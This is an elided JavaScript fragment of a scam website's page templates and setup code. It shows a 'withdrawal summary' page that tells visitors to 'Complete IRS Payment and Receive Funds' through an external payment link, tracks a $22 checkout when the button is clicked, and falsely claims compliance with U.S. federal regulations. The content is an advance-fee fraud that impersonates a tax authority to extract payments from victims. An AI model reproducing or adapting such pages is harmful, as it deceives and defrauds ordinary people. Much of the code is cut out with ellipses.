...
const pages = {
  ...
  registration: `
    <div class="confirmation-container">
      ...
      <!-- Comprovante -->
      <div class="confirmation-section">
        <div class="confirmation-section-title">WITHDRAWAL SUMMARY</div>
        ...
        <div class="confirmation-requirements-grid">
          ...
          <div class="confirmation-requirement-item">
            ...
            <div class="confirmation-requirement-content">
              ...
              <div class="confirmation-requirement-description">
                Verification amount returned within 1 minute
              </div>
            </div>
          </div>
          <div class="confirmation-requirement-item">
...
<a href="https://waymb.com/c?username=eduardotreonix&product=1" class="confirmation-cta-button" id="pay-tax-btn">
          Complete IRS Payment and Receive Funds
        </a>
      ...
      <div class="confirmation-footer">
        <div class="confirmation-footer-text">This process complies with applicable U.S. federal regulations and identity verification requirements.</div>
      </div>
    </div>
  `,
  ...
  .video-container video {
    ...
    height: auto;
    display: block;
    background-color: #000; /* prevents white background during loading */
...
function setupRegistrationPage() {
  ...
  if (payButton) {
    payButton.addEventListener("click", (e) => {
      e.preventDefault();
      // Track InitiateCheckout when clicking "Pay Fee"
      if (typeof trackInitiateCheckout === "function") {
        trackInitiateCheckout(22.00);
      }
      // Show integrated checkout page
...
// Withdrawal methods - global functions
